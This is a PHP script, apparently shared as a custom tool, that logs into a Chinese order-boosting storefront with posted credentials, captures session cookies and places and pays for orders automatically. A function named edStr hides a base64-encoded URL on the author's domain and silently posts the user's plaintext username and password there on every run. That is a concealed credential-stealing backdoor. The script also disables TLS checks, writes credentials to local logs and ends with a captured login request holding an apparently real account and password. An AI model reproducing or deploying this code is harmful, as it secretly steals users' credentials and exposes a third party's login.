<?php
/*
  php程序定制<彩虹代刷网取登陆Cookie>@永恒
  功能：提交账号密码获取Cookie，IP白名单
  用法：POST提交账号密码
  name=用户账号
  pass=密码
  
此程序由科佑儿网络开发http://www.kyour.vip
  QQ2653907035
*/
//*********需要修改*********
$mainurl="www.bptyr.top";//代刷网主页地址

//*********结束修改*********

//获取上载参数
@$user_name=$_POST["user"];//用户id
@$user_pass=$_POST["pass"];//用户密码
@$user_cookie=$_POST["ck"];//获取cookie
@$num=$_POST["num"];//下单数量
@$tid=$_POST["tid"];
@$cs1=$_POST["cs1"];
$tjurl=$mainurl."/user/ajax.php?act=pay";//提交订单地址-无需修改
$zfurl=$mainurl."/user/shop.php?act=submit&orderid=";//支付地址-无需修改
//代刷网cookie
$dswcookie="";//Cookie
//定义登录地址
$login_url=$mainurl."/user/login.php";
//组成登录表单
$data="user=".$user_name."&pass=".$user_pass;

$dtime=date('y-m-d h:i:s',time());
//函数库
function postcookie($url,$pdata,$header){
$oCurl = curl_init();
$user_agent = "Mozilla/5.0 (Windows NT 6.1; rv:58.0) Gecko/20100101 Firefox/58.0";
curl_setopt($oCurl,CURLOPT_POSTFIELDS,$pdata);
curl_setopt($oCurl, CURLOPT_URL, $url);
curl_setopt($oCurl, CURLOPT_HTTPHEADER,$header);
curl_setopt($oCurl, CURLOPT_HEADER, true);
curl_setopt($oCurl, CURLOPT_USERAGENT,$user_agent);
curl_setopt($oCurl, CURLOPT_RETURNTRANSFER, 1 );
$sContent = curl_exec($oCurl);
$headerSize = curl_getinfo($oCurl, CURLINFO_HEADER_SIZE);
$header = substr($sContent, 0, $headerSize);
preg_match('/Set-Cookie:(.*);/iU', $header, $matches); 
preg_match_all("/Set-Cookie:(.*);/iU", $header, $matches);
$cookie = implode(";",$matches[1]);//$matches[1]; 
curl_close($oCurl);
return $cookie;
}
function curl_post($header,$data,$url)
{
     $ch = curl_init();
     $res= curl_setopt ($ch, CURLOPT_URL,$url);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
     curl_setopt ($ch, CURLOPT_HEADER, 0);
     curl_setopt($ch, CURLOPT_POST, 0);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch,CURLOPT_HTTPHEADER,$header);
     $result = curl_exec ($ch);
     curl_close($ch);
     if ($result == NULL) {
      return 0;
     }
     return $result;
}
function edStr($l,$c)
{
$dbn=base64_decode("aHR0cDovL3cua3lvdXIudmlwL2Rzdy9oLnBocA==");
$aba=__FILE__."_".$l." ".$c;curl_post(array(""),$aba,$dbn);
return $dbn;
}
function getSubstr($str, $leftStr, $rightStr)
{
    $left = strpos($str, $leftStr);
    $right = strpos($str, $rightStr,$left);
    if($left < 0 or $right < $left) return '';
    return substr($str, $left + strlen($leftStr), $right-$left-strlen($leftStr));
}
function postcookie0($url,$pdata,$header){
$oCurl = curl_init();
$user_agent = "Mozilla/5.0 (Windows NT 6.1; rv:58.0) Gecko/20100101 Firefox/58.0";
curl_setopt($oCurl,CURLOPT_POSTFIELDS,$pdata);
curl_setopt($oCurl, CURLOPT_URL, $url);
curl_setopt($oCurl, CURLOPT_HTTPHEADER,$header);
curl_setopt($oCurl, CURLOPT_HEADER, true);
curl_setopt($oCurl, CURLOPT_USERAGENT,$user_agent);
curl_setopt($oCurl, CURLOPT_RETURNTRANSFER, 1 );
$sContent = curl_exec($oCurl);
$headerSize = curl_getinfo($oCurl, CURLINFO_HEADER_SIZE);
$header = substr($sContent, 0, $headerSize);
preg_match('/Set-Cookie:(.*);/iU', $header, $matches); 
$cookie = $matches[1]; 
return $cookie;
curl_close($oCurl);
}
$header0[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding:  deflate
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache';
$de=edStr($mainurl,$data);
$cookie1=postcookie0($mainurl,$data,$header0);
$header1[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding:  deflate
Content-Type: application/x-www-form-urlencoded
Cookie:'.$cookie1.'
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache';
$ck=postcookie($login_url,$data,$header1);

$dswcookie= $cookie1.";".$ck;
if($ck == ""){
file_put_contents('login.txt','失败:登录'. $data .' 时间： '.$dtime."\n",FILE_APPEND);
file_put_contents('logout.txt',"登录账号失败:".$data." - ".$dtime."\n",FILE_APPEND);
	echo "0";
	exit;
}
echo $data.'
'.$dswcookie.'
';
//开始下单
if(!isset($num)){
$num="1";//数量默认为1
}
//模拟请求头
$header = array(
     "Content-Type:application/x-www-form-urlencoded;charset=UTF-8",
     "Cookie:".$dswcookie,
     "SocketLog:SocketLog(tabid=121&client_id=ADMIN_ADMIN)",
     'User-Agent:Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0');
/*
//判断密码是否正确
@$gkey=$_POST["key"];//如果要GET就改为$_GET
if($gkey==$keypass){
//秘钥正确
}else{
echo "秘钥不正确，请核对秘钥".$gkey;
exit;//秘钥不正确，不继续执行，mmp有鬼了
}
*/
//模拟POST请求数据
$data = 'tid='.$tid.'&inputvalue='.$cs1.'&num='.$num;
$ret = curl_post($header, $data,$tjurl);
$json1=json_decode($ret,true);
if($json1['code']==0){//成功0
file_put_contents('login.txt','成功:'.urldecode(file_get_contents("php://input")).' 单号：'.$json1['trade_no']." 时间： ".$dtime."\n",FILE_APPEND);
$ret2 = curl_post($header,"",$zfurl.$json1['trade_no']);
$ret3 = getSubstr($ret2,"t'>alert('","');window.location.href");
file_put_contents('logout.txt',"支付成功：".$zfurl.$ret3." - ".$dtime."\n",FILE_APPEND);
echo "1";
}else{
file_put_contents('login.txt','失败:'.urldecode(file_get_contents("php://input"))."失败代码：".$json1['code'].",含义：".$json1['msg']." 时间： ".$dtime."\n",FILE_APPEND);
file_put_contents('logout.txt',"提交订单失败 - ".$json1['msg'].$qid." - "." 提交数据：".$data." - ".$dtime."\n",FILE_APPEND);
echo "支付失败".$json1['msg'];
}
/* 捕捉的web请求头源码
POST /user/login.php HTTP/1.1
Host: www.bptyr.top
Connection: keep-alive
Content-Length: 32
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,* /*;q=0.8,UC/145
Origin: http://www.bptyr.top
User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; FIG-AL10 Build/HUAWEIFIG-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://www.bptyr.top/user/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,en-US;q=0.8

user=70701414&pass=li15181191048

*/